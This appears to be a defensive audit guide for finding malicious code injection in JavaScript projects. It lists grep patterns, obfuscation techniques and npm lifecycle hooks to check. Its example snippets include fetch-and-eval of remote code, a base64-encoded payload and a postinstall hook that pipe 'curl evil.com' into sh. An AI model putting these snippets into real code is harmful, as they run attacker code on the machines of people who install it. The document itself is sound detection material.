# Malicious Code Injection Patterns

Patterns indicating dynamic code execution, obfuscation, and lifecycle script exploits.

## Grep Patterns

```bash
# Dynamic code execution
grep -rnE "\beval\s*\(" --include="*.ts" --include="*.js" --include="*.mjs"
grep -rnE "new\s+Function\s*\(" --include="*.ts" --include="*.js"
grep -rnE "vm\.(runInNewContext|runInThisContext|compileFunction|Script)" --include="*.ts" --include="*.js"

# String-based require/import
grep -rnE "require\s*\(\s*[^'\"]" --include="*.ts" --include="*.js"
grep -rnE "import\s*\(\s*[^'\"]" --include="*.ts" --include="*.js"

# Obfuscation indicators
grep -rnE "(\\x[0-9a-fA-F]{2}){4,}" --include="*.ts" --include="*.js"
grep -rnE "(String\.fromCharCode|charCodeAt|atob|btoa)" --include="*.ts" --include="*.js"
grep -rnE "Buffer\.from\(['\"][A-Za-z0-9+/=]{20,}" --include="*.ts" --include="*.js"

# Postinstall / preinstall scripts
grep -rnE "\"(pre|post)(install|publish|pack)\"" package.json
```

## Suspicious Patterns

### 1. Direct eval() with External Data

```javascript
// 🔴 CRITICAL — Executing fetched code
const code = await fetch("https://evil.com/payload.js").then(r => r.text());
eval(code);
```

### 2. Function Constructor

```javascript
// 🔴 CRITICAL — Disguised eval
const fn = new Function("return " + userInput);
fn();
```

### 3. Character-by-Character Assembly

```javascript
// 🔴 CRITICAL — Obfuscated string construction
const chars = [114,101,113,117,105,114,101]; // "require"
const fn = String.fromCharCode(...chars);
globalThis[fn]("child_process").execSync("curl evil.com | sh");
```

### 4. Base64 Payload Execution

```javascript
// 🔴 CRITICAL — Decoded and executed payload
const payload = Buffer.from(
  "cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjdXJsIGV2aWwuY29tIHwgc2gnKQ==",
  "base64"
).toString();
eval(payload);
```

### 5. postinstall Script Exploit

```json
// 🔴 CRITICAL — package.json lifecycle hook
{
  "scripts": {
    "postinstall": "node -e \"require('child_process').execSync('curl https://evil.com/install.sh | sh')\""
  }
}
```

### 6. Dynamic require() with Computed Path

```javascript
// 🔴 CRITICAL — Loading unknown module at runtime
const moduleName = Buffer.from("Y2hpbGRfcHJvY2Vzcw==", "base64").toString();
const cp = require(moduleName);
cp.execSync(command);
```

### 7. Prototype Pollution Leading to Code Execution

```javascript
// 🔴 CRITICAL — Polluting prototype to inject behavior
const obj = JSON.parse(userInput);
// If userInput = {"__proto__": {"polluted": true}}
Object.assign({}, obj);
```

## Obfuscation Techniques to Detect

| Technique | Pattern | Example |
|-----------|---------|---------|
| Hex encoding | `\x72\x65\x71` | `\x72\x65\x71\x75\x69\x72\x65` = "require" |
| Unicode escape | `\u0065\u0076\u0061\u006c` | = "eval" |
| `String.fromCharCode` | `String.fromCharCode(114,101,113)` | = "req" |
| Base64 + Buffer | `Buffer.from("...", "base64")` | Decoded payload |
| Array join | `["e","v","a","l"].join("")` | = "eval" |
| Property accessor | `global["ev"+"al"]` | = `global.eval` |
| `Reflect.apply` | `Reflect.apply(eval, null, [...])` | Indirect eval |

## package.json Lifecycle Scripts to Audit

Always check these fields in `package.json`:

```
preinstall, install, postinstall,
prepublish, prepublishOnly, publish, postpublish,
prepack, postpack, prepare
```

Flag any script that:
- Uses `curl`, `wget`, `node -e`, or `npx` with external URLs
- Runs shell commands beyond basic build steps
- Downloads and executes remote code
- Accesses `process.env` and sends data externally
